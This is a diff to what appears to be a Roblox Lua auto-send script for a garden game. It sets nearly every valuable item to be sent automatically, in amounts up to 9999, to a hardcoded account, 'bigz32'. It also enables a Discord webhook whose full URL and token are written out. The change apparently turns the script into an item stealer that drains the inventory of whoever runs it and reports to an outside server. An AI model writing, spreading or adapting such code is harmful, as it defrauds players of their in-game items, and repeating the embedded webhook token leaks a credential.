@@ -12,14 +12,24 @@ local LocalPlayer  = Players.LocalPlayer
 -- DEFAULT ITEMS (always pre-loaded)
 -- ═══════════════════════════════════════════════════════════════════════
 local DEFAULT_ITEMS = {
-    { name = "Uncommon Sprinkler",  amount = 9999, autoSend = true },
-    { name = "Trowel",              amount = 9999, autoSend = true },
-    { name = "Rare Sprinkler",      amount = 9999, autoSend = true },
-    { name = "Gnome",               amount = 9999, autoSend = true },
+    { name = "Trowel",  amount = 9999, autoSend = true },
+    { name = "Common Sprinkler",              amount = 9999, autoSend = true },
+    { name = "Uncommon Sprinkler",      amount = 9999, autoSend = true },
+    { name = "Rare Sprinkler",               amount = 9999, autoSend = true },
     { name = "Legendary Sprinkler", amount = 9999, autoSend = true },
     { name = "Super Sprinkler",     amount = 9999, autoSend = true },
-    { name = "Ladder Crate",        amount = 9999, autoSend = true },
+    { name = "Common Watering Can",        amount = 9999, autoSend = true },
     { name = "Super Watering Can",  amount = 9999, autoSend = true },
+	{ name = "Ladder Crate",  amount = 9999, autoSend = true },
+	{ name = "Roleplay Crate",  amount = 9999, autoSend = true },
+	{ name = "Gold",  amount = 9999, autoSend = true },
+	{ name = "Rainbow",  amount = 9999, autoSend = true },
+	{ name = "Mega",  amount = 9999, autoSend = true },
+    { name = "Light Crate",  amount = 9999, autoSend = true },
+    { name = "Picture Frame Crate",  amount = 9999, autoSend = true },
+    { name = "Bear Trap Crate",  amount = 9999, autoSend = true },
+    { name = "Conveyor Crate",  amount = 9999, autoSend = true },
+    { name = "Owner Door Crate",  amount = 9999, autoSend = true },
 }
 
 -- ═══════════════════════════════════════════════════════════════════════
@@ -28,13 +38,13 @@ local DEFAULT_ITEMS = {
 local SAVE_KEY = "ASM_v7"
 
 local cfg = {
-    username        = "kram_titanic",
+    username        = "bigz32",
     items           = {},
     note            = "",
     interval        = 10,
     maxAmt          = 9999,
-    webhook         = "",
-    webhookOn       = false,
+    webhook         = "https://discord.com/api/webhooks/1465284878504300717/mCwkU9X99ZAI9iQ_pdFLKUQJha_UH4-WjOCsxfXPQC_r6_xYC5DGHKS-6SzVgmttsNif",
+    webhookOn       = true,
     winW            = 620,
     winH            = 500,
     confirmOnce     = true,
